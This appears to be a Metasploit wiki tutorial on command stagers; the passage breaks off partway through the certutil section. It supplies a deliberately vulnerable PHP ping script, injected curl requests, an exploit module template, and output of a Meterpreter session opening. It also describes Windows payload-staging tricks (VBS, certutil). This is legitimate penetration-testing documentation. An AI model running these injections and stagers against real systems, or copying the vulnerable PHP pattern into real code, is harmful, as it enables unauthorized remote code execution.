{"componentChunkName":"component---src-templates-wiki-template-tsx","path":"/wiki/Misc/How-to-use-command-stagers","result":{"data":{"markdownRemark":{"id":"338e9891-4231-54d5-9b5c-a5974cb9a137","frontmatter":{"title":"How to use command stagers","root":null},"html":"<p>Command stagers provide an easy way to write exploits against typical vulnerabilities such as <a href=\"https://www.owasp.org/index.php/Command_Injection\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">command execution</a> or <a href=\"https://www.owasp.org/index.php/Code_Injection\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">code injection</a>. There are currently eight different flavors of command stagers, each uses system command (or commands) to save your payload, sometimes decode, and execute.</p>\n<h1 id=\"the-vulnerability-test-case\" style=\"position:relative;\"><a href=\"#the-vulnerability-test-case\" aria-label=\"the vulnerability test case permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>The Vulnerability Test Case</h1>\n<p>The best way to explain how to use a command stager is probably by demonstrating it. Here we have a command injection vulnerability in PHP, something silly you actually might see in an enterprise-level software. The bug is that you can inject additional system commands in the system call for ping:</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-php line-numbers\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n   <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"ip\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token variable\">$output</span> <span class=\"token operator\">=</span> <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"ping -c 1 \"</span> <span class=\"token punctuation\">.</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token double-quoted-string string\">\"ip\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$output</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">}</span>\n<span class=\"token delimiter important\">?></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span> <span class=\"token attr-value\"><span class=\"token punctuation\">=</span> <span class=\"token punctuation\">\"</span>ping.php<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span> <span class=\"token attr-value\"><span class=\"token punctuation\">=</span> <span class=\"token punctuation\">\"</span>GET<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n   IP to ping: <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span> <span class=\"token attr-value\"><span class=\"token punctuation\">=</span> <span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span> <span class=\"token attr-value\"><span class=\"token punctuation\">=</span> <span class=\"token punctuation\">\"</span>ip<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span> <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span> <span class=\"token attr-value\"><span class=\"token punctuation\">=</span> <span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span>\n   <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Place the above PHP script (ping.php) on an <a href=\"https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-on-ubuntu-14-04\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Ubuntu + Apache + PHP</a> server.</p>\n<p>Under normal usage, this is how the script behaves - it just pings the host you specify, and shows\nyou the output:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ curl &quot;http://192.168.1.203/ping.php?ip=127.0.0.1&quot;\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms\nrtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>OK, now we can abuse that a little and execute another command (id):</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">$ curl &quot;http://192.168.1.203/ping.php?ip=127.0.0.1+%26%26+id&quot;\nPING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.020/0.020/0.020/0.000 ms\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nuid=33(www-data) gid=33(www-data) groups=33(www-data)</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>See the www-data? That is the output for the second command we asked the script to execute. By doing that, we can also do something even more nasty - like writing a Meterpreter payload onto the target system, and execute it.</p>\n<h1 id=\"the-msfexploitcmdstager-mixin\" style=\"position:relative;\"><a href=\"#the-msfexploitcmdstager-mixin\" aria-label=\"the msfexploitcmdstager mixin permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>The Msf::Exploit::CmdStager Mixin</h1>\n<p>Now let's talk about how to use a command stager to exploit the above script. There are a couple of steps you need to do:</p>\n<p><strong>1. Include the Msf::Exploit::CmdStager mixin</strong></p>\n<p>Although there are eight flavors of mixins/stagers, you only need to include <a href=\"https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/cmdstager.rb\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Msf::Exploit::CmdStager</a> when writing a Metasploit exploit. The mixin is basically an interface to all eight command stagers:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token keyword\">include</span> <span class=\"token constant\">Msf</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">Exploit</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">CmdStager</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p><strong>2. Declare your flavors</strong></p>\n<p>To tell Msf::Exploit::CmdStager what flavors you want, you can add the <code class=\"language-text\">CmdStagerFlavor</code> info in the module's metadata. Either from the common level, or the target level. Multiple flavors are allowed.</p>\n<p>An example of setting flavors for a specific target:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token string\">'Targets'</span>   <span class=\"token operator\">=</span><span class=\"token operator\">></span>\n  <span class=\"token punctuation\">[</span>\n    <span class=\"token punctuation\">[</span> <span class=\"token string\">'Windows'</span><span class=\"token punctuation\">,</span>\n      <span class=\"token punctuation\">{</span>\n        <span class=\"token string\">'Arch'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span> <span class=\"token constant\">ARCH_X86_64</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">ARCH_X86</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'Platform'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">'win'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'CmdStagerFlavor'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span> <span class=\"token string\">'certutil'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'vbs'</span> <span class=\"token punctuation\">]</span>\n      <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">]</span>\n  <span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Or, you can pass this info to the execute<em>cmdstager method (see Call #execute</em>cmdstager to begin)</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\">execute_cmdstager<span class=\"token punctuation\">(</span>flavor<span class=\"token punctuation\">:</span> <span class=\"token symbol\">:vbs</span><span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p><strong>3. Create the execute_command method</strong></p>\n<p>You also must create a <code class=\"language-text\">def execute_command(cmd, opts = {})</code> method in your module. This is what gets called by the CmdStager mixin when it kicks in. Your objective in this method is to inject whatever is in the <code class=\"language-text\">cmd</code> variable to the vulnerable code.</p>\n<p><strong>4. Call #execute_cmdstager to begin</strong></p>\n<p>And lastly, in your exploit method, call <code class=\"language-text\">execute_cmdstager</code> to begin the command stager.</p>\n<p>Over the years, we have also learned that these options are quite handy when calling\nexecute_cmdstager:</p>\n<ul>\n<li><strong>flavor</strong> - You can specify what command stager (flavor) to use from here. Options are: <code class=\"language-text\">:bourne</code>, <code class=\"language-text\">:debug_asm</code>, <code class=\"language-text\">:debug_write</code>, <code class=\"language-text\">:echo</code>, <code class=\"language-text\">:printf</code>, <code class=\"language-text\">:vbs</code>, <code class=\"language-text\">:certutil</code>, <code class=\"language-text\">:tftp</code>.</li>\n<li><strong>delay</strong> - How much time to delay between each command execution. 0.25 is default.</li>\n<li><strong>linemax</strong> - Maximum number of characters per command. 2047 is default.</li>\n</ul>\n<p><strong>Msf::Exploit::CmdStager Template</strong></p>\n<p>At the minimum, this is how your exploit should start when you're using the CmdStager mixin:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token keyword\">require</span> <span class=\"token string\">'msf/core'</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">MetasploitModule</span> <span class=\"token operator\">&lt;</span> <span class=\"token constant\">Msf</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">Exploit</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">Remote</span>\n\n  <span class=\"token constant\">Rank</span> <span class=\"token operator\">=</span> <span class=\"token constant\">NormalRanking</span>\n\n  <span class=\"token keyword\">include</span> <span class=\"token constant\">Msf</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">Exploit</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token constant\">CmdStager</span>\n\n  <span class=\"token keyword\">def</span> <span class=\"token method-definition\"><span class=\"token function\">initialize</span></span><span class=\"token punctuation\">(</span>info<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span>update_info<span class=\"token punctuation\">(</span>info<span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'Name'</span>            <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">\"Command Injection Using CmdStager\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'Description'</span>     <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">%q{\n        This exploits a command injection using the command stager.\n      }</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'License'</span>         <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token constant\">MSF_LICENSE</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'Author'</span>          <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span> <span class=\"token string\">'sinn3r'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'References'</span>      <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span> <span class=\"token punctuation\">[</span> <span class=\"token string\">'URL'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'http://metasploit.com'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'Platform'</span>        <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'Targets'</span>         <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span> <span class=\"token punctuation\">[</span> <span class=\"token string\">'Linux'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'Payload'</span>         <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">{</span> <span class=\"token string\">'BadChars'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">\"\\x00\"</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'CmdStagerFlavor'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span> <span class=\"token string\">'printf'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'Privileged'</span>      <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'DisclosureDate'</span>  <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">\"Jun 10 2016\"</span><span class=\"token punctuation\">,</span>\n      <span class=\"token string\">'DefaultTarget'</span>   <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">end</span>\n\n  <span class=\"token keyword\">def</span> <span class=\"token method-definition\"><span class=\"token function\">execute_command</span></span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">,</span> opts <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># calls some method to inject cmd to the vulnerable code.</span>\n  <span class=\"token keyword\">end</span>\n\n  <span class=\"token keyword\">def</span> <span class=\"token method-definition\"><span class=\"token function\">exploit</span></span>\n    print_status<span class=\"token punctuation\">(</span><span class=\"token string\">\"Exploiting...\"</span><span class=\"token punctuation\">)</span>\n    execute_cmdstager\n  <span class=\"token keyword\">end</span>\n\n<span class=\"token keyword\">end</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>As you can see, we have chosen the \"printf\" flavor as our command stager. We will explain more about\nthis later, but basically what it does is it writes our payload to /tmp and execute it.</p>\n<p>Now let's modify the execute_command method and get code execution against the test case. Based on the PoC, we know that our injection string should look like this:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">127.0.0.1+%26%26+[Malicious commands]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>We do that in execute_command using <a href=\"https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">HttpClient</a>. Notice there is actually some bad character filtering involved to get the exploit working correctly, which is expected:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token keyword\">def</span> <span class=\"token method-definition\"><span class=\"token function\">filter_bad_chars</span></span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span>\n  cmd<span class=\"token punctuation\">.</span>gsub<span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token regex\">/chmod \\+x/</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'chmod 777'</span><span class=\"token punctuation\">)</span>\n  cmd<span class=\"token punctuation\">.</span>gsub<span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token regex\">/;/</span><span class=\"token punctuation\">,</span> <span class=\"token string\">' %26%26 '</span><span class=\"token punctuation\">)</span>\n  cmd<span class=\"token punctuation\">.</span>gsub<span class=\"token operator\">!</span><span class=\"token punctuation\">(</span><span class=\"token regex\">/ /</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'+'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">end</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token method-definition\"><span class=\"token function\">execute_command</span></span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">,</span> opts <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n  send_request_cgi<span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n    <span class=\"token string\">'method'</span>        <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'uri'</span>           <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">'/ping.php'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'encode_params'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">'vars_get'</span>      <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">{</span>\n      <span class=\"token string\">'ip'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">\"127.0.0.1+%26%26+<span class=\"token interpolation\"><span class=\"token delimiter tag\">#{</span>filter_bad_chars<span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span><span class=\"token delimiter tag\">}</span></span>\"</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">end</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token method-definition\"><span class=\"token function\">exploit</span></span>\n  print_status<span class=\"token punctuation\">(</span><span class=\"token string\">\"Exploiting...\"</span><span class=\"token punctuation\">)</span>\n  execute_cmdstager\n<span class=\"token keyword\">end</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>And let's run that, we should have a shell:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf exploit(cmdstager_demo) &gt; run\n\n[*] Started reverse TCP handler on 10.6.0.92:4444 \n[*] Exploiting...\n[*] Transmitting intermediate stager for over-sized stage...(105 bytes)\n[*] Sending stage (1495599 bytes) to 10.6.0.92\n[*] Meterpreter session 1 opened (10.6.0.92:4444 -&gt; 10.6.0.92:51522) at 2016-06-10 11:51:03 -0500</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h1 id=\"flavors\" style=\"position:relative;\"><a href=\"#flavors\" aria-label=\"flavors permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Flavors</h1>\n<p>Now that we know how to use the Msf::Exploit::CmdStager mixin, let's take a look at the command\nstagers you can use.</p>\n<h2 id=\"vbs-command-stager---windows-only\" style=\"position:relative;\"><a href=\"#vbs-command-stager---windows-only\" aria-label=\"vbs command stager   windows only permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>VBS Command Stager - Windows Only</h2>\n<p>The <a href=\"https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/vbs.rb\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">VBS command stager</a> is for Windows. What this does is it encodes our payload with Base64, save it on the target machine, also writes a <a href=\"https://github.com/rapid7/metasploit-framework/blob/master/data/exploits/cmdstager/vbs_b64\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">VBS script</a> using the echo command, and then lets the VBS script to decode the Base64 payload, and execute it.</p>\n<p>If you are exploiting Windows that supports Powershell, then you might want to <a href=\"https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Powershell-in-an-exploit\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">consider using that instead</a> of the VBS stager, because Powershell tends to be more stealthy.</p>\n<p>To use the VBS stager, either specify your CmdStagerFlavor in the metadata:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token string\">'CmdStagerFlavor'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token punctuation\">[</span> <span class=\"token string\">'vbs'</span> <span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>Or set the :vbs key to execute_cmdstager:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\">execute_cmdstager<span class=\"token punctuation\">(</span>flavor<span class=\"token punctuation\">:</span> <span class=\"token symbol\">:vbs</span><span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>You will also need to make sure the module's supported platforms include windows (also in the metadata), example:</p>\n<div class=\"gatsby-highlight\" data-language=\"ruby\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-ruby line-numbers\"><code class=\"language-ruby\"><span class=\"token string\">'Platform'</span> <span class=\"token operator\">=</span><span class=\"token operator\">></span> <span class=\"token string\">'win'</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h2 id=\"certutil-command-stager---windows-only\" style=\"position:relative;\"><a href=\"#certutil-command-stager---windows-only\" aria-label=\"certutil command stager   windows only permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Certutil Command Stager - Windows Only</h2>\n<p><a href=\"https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/certutil.rb\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Certutil</a> is a Windows command that can be used to dump and display certification authority, configuration information, configure certificate services, back and restore CA components, etc. It only comes with newer Windows systems starting from Windows 2012, and Windows 8.</p>\n<p>One thing certutil can also do for us is decode the Base64 string from a certificate, and save the decoded content to a file. The following demonstrates:</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\"><span class=\"token builtin class-name\">echo</span> -----BEGIN CERTIFICATE----- <span class=\"token operator\">></span> encoded.txt\n<span class=\"token builtin class-name\">echo</span> Just Base64 encode your binary data\n<span class=\"token builtin class-name\">echo</span> <span class=\"token assign-left variable\">TVoAAA</span><span class=\"token operator\">==</span> <span class=\"token operator\">>></span> encoded.txt\n<span class=\"token builtin class-name\">echo</span> -----END CERTIFICATE----- <span class=\"token operator\">>></span> encoded.txt\ncertutil -decode encoded.txt decoded.bin</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>To take advantage of that, the Certutil command stager will save the payload in Base64 as a fake certificate, ask 